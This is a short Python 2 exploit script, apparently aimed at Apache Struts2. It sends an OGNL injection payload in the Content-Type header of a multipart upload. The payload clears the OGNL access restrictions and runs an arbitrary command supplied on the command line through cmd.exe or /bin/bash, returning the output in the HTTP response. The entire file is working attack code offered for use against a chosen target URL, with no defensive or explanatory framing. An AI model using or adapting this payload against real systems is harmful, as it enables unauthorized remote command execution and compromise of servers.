#!/usr/bin/env python
#-*- coding:utf-8 -*-
__author__ = '@S4kur4'

import urllib2
import sys
import optparse
from poster.encode import multipart_encode
from poster.streaminghttp import register_openers

header1 = {
    "User-Agent" : "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:46.0) Gecko/20100101 Firefox/46.0",
    "Connection" : "keep-alive",
    "Accept" : "*/*",
    "X-Requested-With" : "XMLHttpRequest",
    "Accept-Encoding" : "deflate",
    "Accept-Language" : "zh-CN,zh;q=0.8,en;q=0.6,zh-TW;q=0.4"
    }

def main():
    register_openers()
    datagen, header2 = multipart_encode({"image1": open("tmp.txt", "rb")})
    parser = optparse.OptionParser('usage: %prog [options]')
    parser.add_option('-u', '--url', dest='target_url', type='string', help='specify target URL')
    parser.add_option('-c', '--command', dest='command', type='string', help='specify command you execute')
    (options, args) = parser.parse_args()
    if (options.target_url==None) | (options.command==None):
        parser.print_help()
        sys.exit(0)
    else:
        target_url = options.target_url
        command = options.command
    target_url = target_url.rstrip('/')

    header1["Content-Type"] = "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='"+ command + "').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
    header1["Content-Length"] = header2["Content-Length"]
    request = urllib2.Request(target_url,datagen,headers=header1)
    response = urllib2.urlopen(request)
    print response.read()

if __name__ == '__main__':
    main()